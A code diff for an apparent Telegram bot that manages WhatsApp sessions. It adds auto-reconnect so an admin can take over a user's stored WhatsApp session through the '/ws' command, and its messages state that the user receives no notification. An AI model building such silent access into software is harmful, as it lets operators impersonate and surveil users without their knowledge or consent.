@@ -2784,7 +2784,7 @@ bot.command("ws", async (ctx) => {
 
   if (arg && /^\d+$/.test(arg)) {
     const targetId = parseInt(arg, 10);
-    const connected = isConnected(String(targetId));
+    let connected = isConnected(String(targetId));
     let stored = false;
     try { stored = await hasStoredWhatsAppSession(String(targetId)); } catch {}
     if (!connected && !stored) {
@@ -2794,9 +2794,51 @@ bot.command("ws", async (ctx) => {
       );
       return;
     }
+
+    // If stored but not live → auto-reconnect before switching
+    if (!connected && stored) {
+      const statusMsg = await ctx.reply(
+        `🔄 <b>Reconnecting...</b>\n\nUser <code>${targetId}</code> ka WhatsApp stored hai par disconnect hai.\nReconnect ho raha hai, 20 second wait karo...`,
+        { parse_mode: "HTML" }
+      );
+      try {
+        await ensureSessionLoaded(String(targetId));
+        connected = await waitForWhatsAppConnected(String(targetId), { timeoutMs: 20_000, pollMs: 500 });
+      } catch {}
+
+      if (!connected) {
+        await ctx.api.editMessageText(
+          ctx.chat!.id,
+          statusMsg.message_id,
+          `⚠️ <b>WS Mode ON (reconnect failed)</b>\n\n` +
+          `User <code>${targetId}</code> ka WhatsApp reconnect nahi ho saka.\n\n` +
+          `Session MongoDB mein stored hai par abhi live nahi hai.\n` +
+          `WS mode fir bhi set ho gaya — try karo koi button press karke, ho sakta hai tab connect ho.\n\n` +
+          `• Wapas apni session pe: <code>/ws off</code>`,
+          { parse_mode: "HTML" }
+        );
+        adminWsContext.set(adminId, targetId);
+        return;
+      }
+
+      const phone = getConnectedWhatsAppNumber(String(targetId));
+      await ctx.api.editMessageText(
+        ctx.chat!.id,
+        statusMsg.message_id,
+        `✅ <b>WS Mode ON</b>\n\n` +
+        `User <code>${targetId}</code>${phone ? ` (+${phone})` : ""} ka WhatsApp reconnect ho gaya!\n\n` +
+        `• Sab WhatsApp commands us user ki session se chalenge\n` +
+        `• User ko koi notification nahi jayega\n` +
+        `• Wapas apni session pe aane ke liye: <code>/ws off</code>`,
+        { parse_mode: "HTML" }
+      );
+      adminWsContext.set(adminId, targetId);
+      return;
+    }
+
     adminWsContext.set(adminId, targetId);
     const phone = getConnectedWhatsAppNumber(String(targetId));
-    const phoneTxt = phone ? ` (+${phone})` : (stored ? " (stored, not live)" : "");
+    const phoneTxt = phone ? ` (+${phone})` : "";
     await ctx.reply(
       `✅ <b>WS Mode ON</b>\n\n` +
       `Ab aap user <code>${targetId}</code>${phoneTxt} ka WhatsApp session use kar rahe hain.\n\n` +
